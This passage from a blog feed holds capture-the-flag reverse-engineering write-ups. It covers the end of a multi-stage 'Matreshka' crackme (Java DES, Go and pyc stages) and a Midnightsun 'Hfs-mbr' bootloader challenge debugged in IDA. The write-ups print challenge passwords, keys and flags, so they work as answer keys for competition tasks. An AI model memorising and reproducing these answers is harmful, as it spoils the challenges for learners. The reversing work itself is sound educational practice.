class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Code2</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">  <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">byte</span>[] decode(<span class="keyword">byte</span>[] paramArrayOfByte, String paramString) <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">    SecretKeyFactory secretKeyFactory = SecretKeyFactory.getInstance(<span class="string">"DES"</span>);</span><br><span class="line">    <span class="keyword">byte</span>[] arrayOfByte = paramString.getBytes();</span><br><span class="line">    DESKeySpec dESKeySpec = <span class="keyword">new</span> DESKeySpec(arrayOfByte);</span><br><span class="line">    SecretKey secretKey = secretKeyFactory.generateSecret(dESKeySpec);</span><br><span class="line">    Cipher cipher = Cipher.getInstance(<span class="string">"DES"</span>);</span><br><span class="line">    cipher.init(<span class="number">2</span>, secretKey);</span><br><span class="line">    <span class="keyword">return</span> cipher.doFinal(paramArrayOfByte);</span><br><span class="line">  &#125;</span><br><span class="line">  </span><br><span class="line">  <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">byte</span>[] encode(<span class="keyword">byte</span>[] paramArrayOfByte, String paramString) <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">    SecretKeyFactory secretKeyFactory = SecretKeyFactory.getInstance(<span class="string">"DES"</span>);</span><br><span class="line">    <span class="keyword">byte</span>[] arrayOfByte = paramString.getBytes();</span><br><span class="line">    DESKeySpec dESKeySpec = <span class="keyword">new</span> DESKeySpec(arrayOfByte);</span><br><span class="line">    SecretKey secretKey = secretKeyFactory.generateSecret(dESKeySpec);</span><br><span class="line">    Cipher cipher = Cipher.getInstance(<span class="string">"DES"</span>);</span><br><span class="line">    cipher.init(<span class="number">1</span>, secretKey);</span><br><span class="line">    <span class="keyword">return</span> cipher.doFinal(paramArrayOfByte);</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  </span><br><span class="line">  <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] paramArrayOfString)</span> <span class="keyword">throws</span> Exception </span>&#123;</span><br><span class="line">    String str = <span class="string">"matreha!"</span>;</span><br><span class="line">    <span class="keyword">byte</span>[] arrayOfByte2 = &#123; <span class="number">76</span>, -<span class="number">99</span>, <span class="number">37</span>, <span class="number">75</span>, -<span class="number">68</span>, <span class="number">10</span>, -<span class="number">52</span>, <span class="number">10</span>, -<span class="number">5</span>, <span class="number">9</span>, <span class="number">92</span>, <span class="number">1</span>, <span class="number">99</span>, -<span class="number">94</span>, <span class="number">105</span>, -<span class="number">18</span> &#125;;</span><br><span class="line">    <span class="keyword">byte</span>[] userName = decode(arrayOfByte2, str);</span><br><span class="line">    <span class="keyword">byte</span>[] arrayOfByte1 = encode(userName, str);</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">byte</span> b = <span class="number">0</span>; b &lt; arrayOfByte2.length; b++) &#123;</span><br><span class="line">      <span class="keyword">if</span> (arrayOfByte2[b] != arrayOfByte1[b]) &#123;</span><br><span class="line">        System.out.println(<span class="string">"No"</span>);</span><br><span class="line">        <span class="keyword">return</span>;</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    File file = <span class="keyword">new</span> File(<span class="string">"data.bin"</span>);</span><br><span class="line">    FileInputStream fileInputStream = <span class="keyword">new</span> FileInputStream(file);</span><br><span class="line">    <span class="keyword">byte</span>[] arrayOfByte3 = <span class="keyword">new</span> <span class="keyword">byte</span>[(<span class="keyword">int</span>)file.length()];</span><br><span class="line">    fileInputStream.read(arrayOfByte3);</span><br><span class="line">    fileInputStream.close();</span><br><span class="line">    <span class="keyword">byte</span>[] arrayOfByte4 = decode(arrayOfByte3, <span class="keyword">new</span> String(userName));</span><br><span class="line">    FileOutputStream fileOutputStream = <span class="keyword">new</span> FileOutputStream(<span class="string">"stage2.bin"</span>);</span><br><span class="line">    fileOutputStream.write(arrayOfByte4, <span class="number">0</span>, arrayOfByte4.length);</span><br><span class="line">    fileOutputStream.flush();</span><br><span class="line">    fileOutputStream.close();</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>Now compiling it with <strong>javac</strong> and running with <strong>java</strong> commands we get stage2:</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">$ javac wtf.java </span><br><span class="line">$ java Code2</span><br><span class="line">$ file stage2.bin </span><br><span class="line">stage2.bin: ELF 64-bit LSB executable, x86-64, version 1 (SYSV), statically linked, Go BuildID=FBY_TepBaPVEzlo3-SXy/Zsd256T1rd3lPJ9tnxng/YgTlqVI_KVISIMJ6lZi7/tIlG0PXO43MvY1MOVlul, not stripped</span><br></pre></td></tr></table></figure><h3 id="Stage2-golang-binary"><a href="#Stage2-golang-binary" class="headerlink" title="Stage2 (golang binary)"></a>Stage2 (golang binary)</h3><p>Now we have a 64bit ELF, this a <strong>go</strong> binary , this one is very similar to the previous challenge but kind of harder to reverse since is go, this time instead of the system username the directory name is used to encrypt the file:</p><p><a data-fancybox="gallery" href="https://i.imgur.com/Gd4nKtW.png" target="_blank" rel="noopener"><br><img src="https://i.imgur.com/Gd4nKtW.png" alt><br></a></p><p>Once again after this, a verification of an encrypted folder is done before trying to decrypt the stage3 file:</p><p><a data-fancybox="gallery" href="https://i.imgur.com/7rUE08z.png" target="_blank" rel="noopener"><br><img src="https://i.imgur.com/7rUE08z.png" alt><br></a></p><p>After this I created a folder named <strong>abcdefghijklmnopq</strong> which has <strong>0x11</strong> (17 in decimal) of size, I inserted a break point at <strong>cmp     dl, bl</strong> and dumped the encrypted string <strong>abcdefghijklmnopq</strong> and the original encrypted string folder name which is present in the binary.</p><p>First getting the encrypted bytes of the folder I created:<br><a data-fancybox="gallery" href="https://i.imgur.com/UWSKQJg.png" target="_blank" rel="noopener"><br><img src="https://i.imgur.com/UWSKQJg.png" alt><br></a><br>Second get the encrypted bytes of the original folder:<br><a data-fancybox="gallery" href="https://i.imgur.com/b460Sn5.png" target="_blank" rel="noopener"><br><img src="https://i.imgur.com/b460Sn5.png" alt><br></a></p><p>We have everything we need to recover the original folder name! Since is xor encryption we just need to get the bytes of the encrypted string <strong>abcdefghijklmnopq</strong> xor it with the plaintext <strong>abcdefghijklmnopq</strong> and finally <strong>xor</strong> with encrypted original name reversing the all thing, I used a python script to do this:</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">a = [<span class="number">0x59</span>,<span class="number">0xCD</span>,<span class="number">0xC9</span>,<span class="number">0x90</span>,<span class="number">0xE9</span>,<span class="number">0x6E</span>,<span class="number">0x9F</span>,<span class="number">0x23</span>,<span class="number">0x4B</span>,<span class="number">0xAF</span>,<span class="number">0x0B</span>,<span class="number">0x33</span>,<span class="number">0xCC</span>,<span class="number">0x39</span>,<span class="number">0x03</span>,<span class="number">0xDB</span>,<span class="number">0xA0</span>]</span><br><span class="line">cp =[<span class="number">0x53</span>,<span class="number">0xdd</span>,<span class="number">0xc5</span>,<span class="number">0x87</span>,<span class="number">0xe4</span>,<span class="number">0x63</span>,<span class="number">0x99</span>,<span class="number">0x14</span>,<span class="number">0x4f</span>,<span class="number">0xa4</span>,<span class="number">0x14</span>,<span class="number">0x2d</span>,<span class="number">0xc4</span>,<span class="number">0x24</span>,<span class="number">0x04</span>,<span class="number">0xc0</span>,<span class="number">0xb0</span>]</span><br><span class="line">key = <span class="string">''</span></span><br><span class="line"><span class="keyword">for</span> i,c <span class="keyword">in</span> enumerate(<span class="string">'abcdefghijklmnopq'</span>):</span><br><span class="line">key += chr(ord(c) ^ a[i] ^ cp[i])</span><br><span class="line"><span class="keyword">print</span> key</span><br></pre></td></tr></table></figure><p>Getting the original folder name</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">$ python qwd.py </span><br><span class="line">kroshka_matreshka</span><br></pre></td></tr></table></figure><p>To dump the final file just move the binary to a folder named <strong>kroshka_matreshka</strong></p><h3 id="Stage-3-python-pyc-file"><a href="#Stage-3-python-pyc-file" class="headerlink" title="Stage 3 (python pyc file)"></a>Stage 3 (python pyc file)</h3><p>This stage is the easiest one we just need to decompile the <strong>.pyc</strong> with <a href="https://pypi.org/project/uncompyle6/" target="_blank" rel="noopener">https://pypi.org/project/uncompyle6/</a> and we end up with this:</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">decode</span><span class="params">(data, key)</span>:</span></span><br><span class="line">    idx = <span class="number">0</span></span><br><span class="line">    res = []</span><br><span class="line">    <span class="keyword">for</span> c <span class="keyword">in</span> data:</span><br><span class="line">        res.append(chr(c ^ ord(key[idx])))</span><br><span class="line">        idx = (idx + <span class="number">1</span>) % len(key)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> res</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">flag = [</span><br><span class="line"> <span class="number">40</span>, <span class="number">11</span>, <span class="number">82</span>, <span class="number">58</span>, <span class="number">93</span>, <span class="number">82</span>, <span class="number">64</span>, <span class="number">76</span>, <span class="number">6</span>, <span class="number">70</span>, <span class="number">100</span>, <span class="number">26</span>, <span class="number">7</span>, <span class="number">4</span>, <span class="number">123</span>, <span class="number">124</span>, <span class="number">127</span>, <span class="number">45</span>, <span class="number">1</span>, <span class="number">125</span>, <span class="number">107</span>, <span class="number">115</span>, <span class="number">0</span>, <span class="number">2</span>, <span class="number">31</span>, <span class="number">15</span>]</span><br><span class="line">print(<span class="string">'Enter key to get flag:'</span>)</span><br><span class="line">key = input()</span><br><span class="line"><span class="keyword">if</span> len(key) != <span class="number">8</span>:</span><br><span class="line">    print(<span class="string">'Invalid len'</span>)</span><br><span class="line">    quit()</span><br><span class="line">res = decode(flag, key)</span><br><span class="line">print(<span class="string">''</span>.join(res))</span><br></pre></td></tr></table></figure><p>Once again xor encryption since we already know the first 8 bytes of the flag as “cybrics{“ if we xor this with the first bytes of the encrypted flag we will get the key it’s easy to write a python script for this:</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">c = [<span class="number">40</span>, <span class="number">11</span>, <span class="number">82</span>, <span class="number">58</span>, <span class="number">93</span>, <span class="number">82</span>, <span class="number">64</span>, <span class="number">76</span>, <span class="number">6</span>, <span class="number">70</span>, <span class="number">100</span>, <span class="number">26</span>, <span class="number">7</span>, <span class="number">4</span>, <span class="number">123</span>, <span class="number">124</span>, <span class="number">127</span>, <span class="number">45</span>, <span class="number">1</span>, <span class="number">125</span>, <span class="number">107</span>, <span class="number">115</span>, <span class="number">0</span>, <span class="number">2</span>, <span class="number">31</span>, <span class="number">15</span>]</span><br><span class="line">x = <span class="number">0</span></span><br><span class="line">key = <span class="string">''</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="string">'cybrics&#123;'</span>:</span><br><span class="line">key += chr(ord(i) ^ c[x])</span><br><span class="line">x += <span class="number">1</span></span><br><span class="line"><span class="keyword">print</span> key</span><br></pre></td></tr></table></figure><p>Getting the key</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">python roflmao.py </span><br><span class="line">Kr0H4137</span><br></pre></td></tr></table></figure><p>The key was <strong>Kr0H4137</strong>, using it to decrypt the flag:</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">$ python3 result.py</span><br><span class="line">Enter key to get flag:</span><br><span class="line">Kr0H4137</span><br><span class="line">cybrics&#123;M4TR35HK4_15_B35T&#125;</span><br></pre></td></tr></table></figure><p>The flag was <strong>cybrics{M4TR35HK4_15_B35T}</strong></p><link rel="stylesheet" href="/css/spoiler.css" type="text/css"><script src="/js/spoiler.js" type="text/javascript" async></script>]]></content>
    
    <summary type="html">
    
      
      
        &lt;blockquote&gt;
&lt;p&gt;Matreshka 50&lt;/p&gt;
&lt;/blockquote&gt;
&lt;blockquote&gt;
&lt;p&gt;&lt;strong&gt;Description&lt;/strong&gt;:&lt;br&gt;Matreshka (Reverse, Easy, 50 pts) Author: Kh
      
    
    </summary>
    
      <category term="Reverse" scheme="https://teamrocketist.github.io/categories/Reverse/"/>
    
    
      <category term="python" scheme="https://teamrocketist.github.io/tags/python/"/>
    
      <category term="java" scheme="https://teamrocketist.github.io/tags/java/"/>
    
      <category term="go" scheme="https://teamrocketist.github.io/tags/go/"/>
    
  </entry>
  
  <entry>
    <title>[Reverse] Midnightsun CTF 2019 - Hfs-mbr</title>
    <link href="https://teamrocketist.github.io/2019/04/06/Reverse-Midnightsun-CTF-2019-Hfs-mbr/"/>
    <id>https://teamrocketist.github.io/2019/04/06/Reverse-Midnightsun-CTF-2019-Hfs-mbr/</id>
    <published>2019-04-06T21:22:16.000Z</published>
    <updated>2019-04-07T00:19:11.116Z</updated>
    
    <content type="html"><![CDATA[<blockquote><p>Hfs-mbr 213</p></blockquote><blockquote><p><strong>Description</strong>:<br>We made a military-grade secure OS for HFS members. Feel free to beta test it for us!<br><strong>Service</strong>: stty -icanon -echo ; nc hfs-os-01.play.midnightsunctf.se 31337 ; stty sane<br><strong>Download</strong>: <a href="https://s3.eu-north-1.amazonaws.com/dl.2019.midnightsunctf.se/529C928A6B855DC07AEEE66037E5452E255684E06230BB7C06690DA3D6279E4C/hfs-os.tar.gz" target="_blank" rel="noopener">hfs-os.tar.gz</a>   </p></blockquote><p>First all I want to thank Midnightsun CTF organizers for such an amazing CTF even that I didn’t have much time to play it due to IRL responsibilities, the few challenges I solved, I learned a lot, it was worth the time invested unlike the time I invested on EncryptCTF where I learned nothing.</p><p>The most awesome of this is challenge is actually the organizers gave instructions on a README file on how to debug this kind of MBR challenges on ida I always debugged this using gdb which is alot harder to analyse and debug specially when both <strong>gef</strong> and <strong>pwndbg</strong> get bugged and stop working leaving you to work on vanilla gdb which is beyond crazy.</p><p>So after extracting we get a bunch of files:</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">$ ls</span><br><span class="line">bin/  dos.img  hfs-os.tar.gz  notes.txt  README  run*</span><br></pre></td></tr></table></figure><p>If we read the <strong>README</strong> we can get some instruction on how to debug on IDA</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">$ cat README</span><br><span class="line">HFS-OS</span><br><span class="line">./run debug (gdb stub) or ./run</span><br><span class="line"></span><br><span class="line">How to debug with IDA</span><br><span class="line">In IDA &gt; Debugger &gt; Attach &gt; Remote debugger (host:1234) &gt; (Debug options &gt; Set specific options, UNCHECK <span class="string">'software breakpoints at eip+1'</span>, CHECK <span class="string">'use CS:IP in real mode'</span>)  &gt; OK  </span><br><span class="line">When attached, Debugger &gt; Manual memory regions &gt; Insert &gt; CHECK 16bit segment &gt; OK  </span><br><span class="line">In the IDA-View, press G, 0x7c00 is <span class="built_in">where</span> the bootloader starts. Set a BP &gt; F9</span><br></pre></td></tr></table></figure><p>If we check up the contents of <strong>run</strong> file we can see if we add a debug parameter we can already setup qemu running on a gdb server at port 1234 (default port when not specifically set):<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">$ cat run </span><br><span class="line"><span class="meta">#! /bin/bash</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> [ <span class="string">"<span class="variable">$1</span>"</span> = <span class="string">"debug"</span> ] ; <span class="keyword">then</span></span><br><span class="line">    <span class="built_in">cd</span> bin &amp;&amp; ./qemu-system-i386 -s -S -m 16 -k en-us -rtc base=localtime -nographic -drive file=../dos.img -boot order=c</span><br><span class="line"><span class="keyword">else</span></span><br><span class="line">    <span class="built_in">cd</span> bin &amp;&amp; ./qemu-system-i386 -m 16 -k en-us -rtc base=localtime -nographic -drive file=../dos.img -boot order=c</span><br><span class="line"><span class="keyword">fi</span></span><br></pre></td></tr></table></figure></p><h3 id="Configuration-IDA"><a href="#Configuration-IDA" class="headerlink" title="Configuration IDA"></a>Configuration IDA</h3><p>You can skip this chapter if you already know about thsi and you just want to check on my solution to solve the challenge.</p><p>when opening <strong>dos.img</strong> change the loading offset to <strong>0x7c00</strong> so ida starts to convert the bytes into assembly form that point:</p><p><a data-fancybox="gallery" href="https://i.imgur.com/rWgSJfD.png" target="_blank" rel="noopener"><br><img src="https://i.imgur.com/rWgSJfD.png" alt><br></a></p><p>After clicking <strong>OK</strong> make sure you say <strong>no</strong> so IDA dissembles it in 16 bit mode:</p><p><a data-fancybox="gallery" href="https://i.imgur.com/gF6As1Q.png" target="_blank" rel="noopener"><br><img src="https://i.imgur.com/gF6As1Q.png" alt><br></a></p><p>Now we just need to follow the instructions on README file:</p><p><a data-fancybox="gallery" href="https://i.imgur.com/IIatduD.png" target="_blank" rel="noopener"><br><img src="https://i.imgur.com/IIatduD.png" alt><br></a></p><p>Select remote gdb debugger:</p><p><a data-fancybox="gallery" href="https://i.imgur.com/7FTTII3.png" target="_blank" rel="noopener"><br><img src="https://i.imgur.com/7FTTII3.png" alt><br></a></p><p>Go to debugger options:</p><p><a data-fancybox="gallery" href="https://i.imgur.com/nh5JH6z.png" target="_blank" rel="noopener"><br><img src="https://i.imgur.com/nh5JH6z.png" alt><br></a></p><p>Now into set specific options:</p><p><a data-fancybox="gallery" href="https://i.imgur.com/xD75asg.png" target="_blank" rel="noopener"><br><img src="https://i.imgur.com/xD75asg.png" alt><br></a></p><p>UNCHECK ‘software breakpoints at eip+1’, CHECK ‘use CS:IP in real mode’</p><p><a data-fancybox="gallery" href="https://i.imgur.com/uKPXdGN.png" target="_blank" rel="noopener"><br><img src="https://i.imgur.com/uKPXdGN.png" alt><br></a></p><p>Still on this window click on memory maps:<br><a data-fancybox="gallery" href="https://i.imgur.com/BcAUSav.png" target="_blank" rel="noopener"><br><img src="https://i.imgur.com/BcAUSav.png" alt><br></a></p><p>Right click and then <strong>insert</strong>:</p><p><a data-fancybox="gallery" href="https://i.imgur.com/dUJ06EN.png" target="_blank" rel="noopener"><br><img src="https://i.imgur.com/dUJ06EN.png" alt><br></a></p><p>Check 16-bit segment and then <strong>OK</strong>:</p><p><a data-fancybox="gallery" href="https://i.imgur.com/YO7LXEK.png" target="_blank" rel="noopener"><br><img src="https://i.imgur.com/YO7LXEK.png" alt><br></a></p><p>Go to process options:</p><p><a data-fancybox="gallery" href="https://i.imgur.com/YjhgWFV.png" target="_blank" rel="noopener"><br><img src="https://i.imgur.com/YjhgWFV.png" alt><br></a></p><p>Set up the hostname to your local ip from your linux machine and change to port to <strong>1234</strong></p><p><a data-fancybox="gallery" href="https://i.imgur.com/Y15qGq3.png" target="_blank" rel="noopener"><br><img src="https://i.imgur.com/Y15qGq3.png" alt><br></a></p><h3 id="Solving-the-problem"><a href="#Solving-the-problem" class="headerlink" title="Solving the problem"></a>Solving the problem</h3><p>First setup the debugging server but just running:<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">$ ./run debug</span><br><span class="line">WARNING: Image format was not specified <span class="keyword">for</span> <span class="string">'../dos.img'</span> and probing guessed raw.</span><br><span class="line">         Automatically detecting the format is dangerous <span class="keyword">for</span> raw images, write operations on block 0 will be restricted.</span><br><span class="line">         Specify the <span class="string">'raw'</span> format explicitly to remove the restrictions.</span><br></pre></td></tr></table></figure></p><p>Setup a breakpoint on <strong>0x7c00</strong> and start debugging:</p><p><a data-fancybox="gallery" href="https://i.imgur.com/v3VoTOG.png" target="_blank" rel="noopener"><br><img src="https://i.imgur.com/v3VoTOG.png" alt><br></a></p><p>We can ignore <strong>sub_7C0C</strong> since is just setting up into video mode if we look up into <strong>sub_7C15</strong> (sometimes this bugs out and ida becomes messed up out of the sudden when this happens the only solution I found was to delete IDA database and redo the configuration steps don’t really know why this happens sometimes):   </p><p><a data-fancybox="gallery" href="https://i.imgur.com/sKhx1NO.png" target="_blank" rel="noopener"><br><img src="https://i.imgur.com/sKhx1NO.png" alt><br></a></p><p>After <strong>sub7E21</strong> you are going to jump into <strong>sub7E06</strong>:</p><p><a data-fancybox="gallery" href="https://i.imgur.com/4XOD2Sn.png" target="_blank" rel="noopener"><br><img src="https://i.imgur.com/4XOD2Sn.png" alt><br></a></p><p>From the picture above you can see before each <strong>call</strong> on <strong>sub_7E2B</strong> if you check on memory for this addresses you will see these are strings of the banner and the message to ask the password for the first part of the challenge:</p><p><a data-fancybox="gallery" href="https://i.imgur.com/eic3oZ8.png" target="_blank" rel="noopener"><br><img src="https://i.imgur.com/eic3oZ8.png" alt><br></a></p><p>By putting a breaking point on ret and running the binary until it reach you can see it printed the banner:</p><p><a data-fancybox="gallery" href="https://i.imgur.com/jPLu3s0.png" target="_blank" rel="noopener"><br><img src="https://i.imgur.com/jPLu3s0.png" alt><br></a></p><p>No we jump into <strong>loc_7E37</strong>:</p><p><a data-fancybox="gallery" href="https://i.imgur.com/EtQ8qMp.png" target="_blank" rel="noopener"><br><img src="https://i.imgur.com/EtQ8qMp.png" alt><br></a></p><p>The loose function 0x818a is the address of Wrong password string and <strong>sub_7E2B</strong> will print it so we want to avoid to jump here:</p><p><a data-fancybox="gallery" href="https://i.imgur.com/bh5fhPF.png" target="_blank" rel="noopener"><br><img src="https://i.imgur.com/bh5fhPF.png" alt><br></a></p><p>Now interpreting the rest of <strong>sub_7E2B</strong></p><p><a data-fancybox="gallery" href="https://i.imgur.com/1md4NgF.png" target="_blank" rel="noopener"><br><img src="https://i.imgur.com/1md4NgF.png" alt><br></a></p><p>The result after jumping:</p><p><a data-fancybox="gallery" href="https://i.imgur.com/kSSLG1b.png" target="_blank" rel="noopener"><br><img src="https://i.imgur.com/kSSLG1b.png" alt><br></a></p><p>Now if you check the <strong>DEADCODE</strong> jump after pressing <strong>a</strong> you can see it after doing its thing it jumps into <strong>loc_7FD9</strong>:</p><p><a data-fancybox="gallery" href="https://i.imgur.com/CRyQdtO.png" target="_blank" rel="noopener"><br><img src="https://i.imgur.com/CRyQdtO.png" alt><br></a></p><p>Let’s see what happens if we press <strong>e</strong>:</p><p><a data-fancybox="gallery" href="https://i.imgur.com/rnVFwTF.png" target="_blank" rel="noopener"><br><img src="https://i.imgur.com/rnVFwTF.png" alt><br></a></p><p>If we check what happens if we jump to <strong>loc_7FCE</strong>:</p><p><a data-fancybox="gallery" href="https://i.imgur.com/ZqpAerW.png" target="_blank" rel="noopener"><br><img src="https://i.imgur.com/ZqpAerW.png" alt><br></a></p><p>Now just do this for every letter and you will end up with a list like this:<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line">a -&gt; deadcode</span><br><span class="line">b -&gt; deadcode</span><br><span class="line">c -&gt; deadcode</span><br><span class="line">d -&gt; deadcode</span><br><span class="line">e -&gt; notdeadcode -&gt; if byte_81BA == 7 then &#123;byte_81BB++; byte_81BA++&#125; else byte_81BA++</span><br><span class="line">f -&gt; deadcode</span><br><span class="line">g -&gt; deadcode</span><br><span class="line">h -&gt; deadcode</span><br><span class="line">i -&gt; deadcode</span><br><span class="line">j -&gt; notdeadcode -&gt; if byte_81BA == 2 then &#123;byte_81BB++; byte_81BA++&#125; else byte_81BA++</span><br><span class="line">k -&gt; deadcode</span><br><span class="line">l -&gt; deadcode</span><br><span class="line">m -&gt; deadcode</span><br><span class="line">n -&gt; notdeadcode -&gt; if byte_81BA == 6 then &#123;byte_81BB++; byte_81BA++&#125; else byte_81BA++</span><br><span class="line">o -&gt; notdeadcode -&gt; if byte_81BA == 1 then &#123;byte_81BB++; byte_81BA++&#125; else byte_81BA++</span><br><span class="line">p -&gt; notdeadcode -&gt; if byte_81BA == 4 then &#123;byte_81BB++; byte_81BA++&#125; else byte_81BA++</span><br><span class="line">q -&gt; deadcode</span><br><span class="line">r -&gt; notdeadcode -&gt; if byte_81BA == 8 then &#123;byte_81BB++; byte_81BA++&#125; else byte_81BA++</span><br><span class="line">s -&gt; notdeadcode -&gt; if byte_81BA == 0 then &#123;byte_81BB++; byte_81BA++&#125; else byte_81BA++</span><br><span class="line">t -&gt; deadcode</span><br><span class="line">u -&gt; notdeadcode -&gt; if byte_81BA == 3 then &#123;byte_81BB++; byte_81BA++&#125; else byte_81BA++</span><br><span class="line">v -&gt; deadcode</span><br><span class="line">w -&gt; notdeadcode -&gt; if byte_81BA == 5 then &#123;byte_81BB++; byte_81BA++&#125; else byte_81BA++</span><br><span class="line">x -&gt; deadcode</span><br><span class="line">y -&gt; deadcode</span><br><span class="line">z -&gt; deadcode</span><br><span class="line"></span><br><span class="line">deadcode -&gt; byte_81BA++</span><br></pre></td></tr></table></figure></p><p>The calculations done to calculate the indexes:</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">$ python -c <span class="string">"print 0x73 ^ 0x73"</span> <span class="comment"># s</span></span><br><span class="line"><span class="number">0</span></span><br><span class="line">$ python -c <span class="string">"print (0x8e-(0x20))^0x6f"</span> <span class="comment"># o</span></span><br><span class="line"><span class="number">1</span></span><br><span class="line">$ python -c <span class="string">"print (0x38 + 0x30) ^ 0x6a"</span> <span class="comment"># j</span></span><br><span class="line"><span class="number">2</span></span><br><span class="line">$ python -c <span class="string">"print (0x88-(5*4))^0x70"</span> <span class="comment"># p</span></span><br><span class="line"><span class="number">4</span></span><br><span class="line">$ python -c <span class="string">"print (0x82 - 0x10)^0x77"</span> <span class="comment"># w</span></span><br><span class="line"><span class="number">5</span></span><br><span class="line">$ python -c <span class="string">"print 0x6e ^ 0x68"</span> <span class="comment"># n</span></span><br><span class="line"><span class="number">6</span></span><br><span class="line">$ python -c <span class="string">"print (0x2 + 0x60)^0x65"</span> <span class="comment"># e</span></span><br><span class="line"><span class="number">7</span></span><br><span class="line">$ python -c <span class="string">"print (0xac-(0x52-0x20))^0x72"</span> <span class="comment"># r</span></span><br><span class="line"><span class="number">8</span></span><br></pre></td></tr></table></figure><p>The password was <strong>sojupwner</strong></p><p>Getting the flag:<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">[HFS SECURE BOOT] Loading  ...</span><br><span class="line">.-. .-.----.----.   .-.   .-.----..----.  </span><br><span class="line">| &#123;_&#125; | &#123;_&#123; &#123;__     |  `.<span class="string">'  | &#123;&#125;  | &#123;&#125;  &#125; </span></span><br><span class="line"><span class="string">| &#123; &#125; | | .-._&#125; &#125;   | |\ /| | &#123;&#125;  | .-. \ </span></span><br><span class="line"><span class="string">`-'</span> `-`-<span class="string">' `----'</span>    `-<span class="string">' ` `-`----'</span>`-<span class="string">' `-'</span> </span><br><span class="line">Enter the correct password to unlock the Operating System</span><br><span class="line">[HFS_MBR]&gt; sojupwner</span><br><span class="line">....</span><br><span class="line">[HFS SECURE SHELL] Here is your flag <span class="keyword">for</span> HFS-MBR: midnight&#123;w0ah_Sh!t_jU5t_g0t_RE</span><br><span class="line">ALmode&#125; </span><br><span class="line">[HFS SECURE SHELL] 